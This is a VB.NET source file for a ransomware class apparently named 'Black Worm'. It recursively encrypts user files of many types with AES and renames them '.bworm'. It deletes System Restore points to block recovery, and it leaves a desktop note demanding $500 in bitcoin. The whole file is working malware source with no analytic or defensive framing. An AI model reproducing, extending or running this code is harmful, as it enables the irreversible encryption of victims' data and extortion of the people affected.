﻿Imports System
Imports System.Diagnostics
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Drawing
Imports System.Text
Imports System.Security
Imports System.Security.Cryptography
Imports System.IO
Imports System.Net
Imports Microsoft.Win32
Imports System.Runtime.InteropServices
Imports System.Text.RegularExpressions
Public Class RansomWare
    <DllImport("Srclient.dll")> _
    Public Shared Function SRRemoveRestorePoint(index As Integer) As Integer
    End Function
    Private userName As String = Environment.UserName
    Private computerName As String = System.Environment.MachineName.ToString()
    Private userDir As String = "C:\Users\"
    Private Property targetURL As String
    Public Function AES_Encrypt(ByVal bytesToBeEncrypted As Byte(), ByVal passwordBytes As Byte()) As Byte()
        Dim encryptedBytes As Byte() = Nothing
        Dim saltBytes As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}

        Using ms As MemoryStream = New MemoryStream()

            Using AES As RijndaelManaged = New RijndaelManaged()
                AES.KeySize = 256
                AES.BlockSize = 128
                Dim key = New Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000)
                AES.Key = key.GetBytes(AES.KeySize / 8)
                AES.IV = key.GetBytes(AES.BlockSize / 8)
                AES.Mode = CipherMode.CBC

                Using cs = New CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write)
                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length)
                    cs.Close()
                End Using

                encryptedBytes = ms.ToArray()
            End Using
        End Using

        Return encryptedBytes
    End Function
    Public Function CreatePassword(ByVal length As Integer) As String
        Const valid As String = "abcdefgbijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
        Dim res As StringBuilder = New StringBuilder()
        Dim rnd As Random = New Random()

        While 0 < Math.Max(System.Threading.Interlocked.Decrement(length), length + 1)
            res.Append(valid(rnd.[Next](valid.Length)))
        End While

        Return res.ToString()
    End Function

    Public Function SendPassword(ByVal password As String)
        Dim BlackPassword As String = password
        Return BlackPassword
    End Function
    Public Sub EncryptFile(ByVal file As String, ByVal password As String)
        On Error Resume Next
        Dim bytesToBeEncrypted As Byte() = IO.File.ReadAllBytes(file)
        Dim passwordBytes As Byte() = Encoding.UTF8.GetBytes(password)
        passwordBytes = SHA256.Create().ComputeHash(passwordBytes)
        Dim bytesEncrypted As Byte() = AES_Encrypt(bytesToBeEncrypted, passwordBytes)
        IO.File.WriteAllBytes(file, bytesEncrypted)
        System.IO.File.Move(file, file & ".bworm")
    End Sub
    Public Sub encryptDirectory(ByVal location As String, ByVal password As String)
        On Error Resume Next
        Dim validExtensions = String.Concat(".txt", ".jar", ".exe", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".jpeg", ".gif", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll", ".c", ".cs", ".vb", ".mp3", ".mp4", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".iso", ".7z", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj", ".pdb", ".ico", ".pas", ".db", ".torrent")
        Dim files As String() = Directory.GetFiles(location)
        Dim childDirectories As String() = Directory.GetDirectories(location)
        For i As Integer = 0 To files.Length - 1
            Dim extension As String = Path.GetExtension(files(i))
            If validExtensions.Contains(extension) Then
                EncryptFile(files(i), password)
            End If
        Next
        For i As Integer = 0 To childDirectories.Length - 1
            encryptDirectory(childDirectories(i), password)
        Next
    End Sub
    Public Function startAction()
        Dim path2 As String = "\Desktop\READ_IT.txt"
        Dim fullpath As String = userDir & userName & path2
        On Error Resume Next
        Dim password As String = ENB("BWORM[" & A.MTX & "-" & CreatePassword(20) & "]")
        IO.File.WriteAllText(Environ("Temp") & "\Ransom.dat", "Yes")
        Dim path As String = "\"
        Dim startPath As String = userDir & userName & path
        A.ransompassword = SendPassword(password)
        removeRestorePoint()
        encryptDirectory(startPath, password)
        messageCreator(A.BitcoinAddress)
        password = Nothing
        Process.Start(fullpath)
    End Function
    Public Function messageCreator(ByVal BitcoitAddress As String)
        Dim path As String = "\Desktop\READ_IT.txt"
        Dim fullpath As String = userDir & userName & path
        Dim lines As String() = {"[ Warning ]", "Your Files has been encrypted with Black Worm RansomWare", "Send 500$ in bitcoins to my Bitcoin Address", "Bicoint Address : " & BitcoitAddress, "[ End Of Message ]"}
        System.IO.File.WriteAllLines(fullpath, lines)
    End Function
    Public Sub removeRestorePoint()
        Try
            Dim objClass As New System.Management.ManagementClass("\\.\root\default", "systemrestore", New System.Management.ObjectGetOptions())
            Dim objCol As System.Management.ManagementObjectCollection = objClass.GetInstances()

            Dim Results As New StringBuilder()
            For Each objItem As System.Management.ManagementObject In objCol
                Dim intReturn As Integer = SRRemoveRestorePoint(CUInt(objItem("sequencenumber")))
            Next
        Catch ex As Exception

        End Try

    End Sub
End Class